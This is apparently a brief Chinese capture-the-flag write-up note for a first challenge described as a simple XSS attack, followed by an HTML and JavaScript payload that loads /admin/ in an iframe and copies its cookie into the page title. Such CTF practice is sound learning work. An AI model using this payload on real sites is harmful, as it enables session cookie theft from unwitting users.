第一问就是简单的xss攻击（感觉还是XSS学少了）

```html
<iframe src="/admin/"></iframe>
<script>
document.title = 'running';
setTimeout(()=>{
    document.title = 'got: ' + document.querySelector('iframe').contentDocument.cookie;
}, 500);
</script>
```

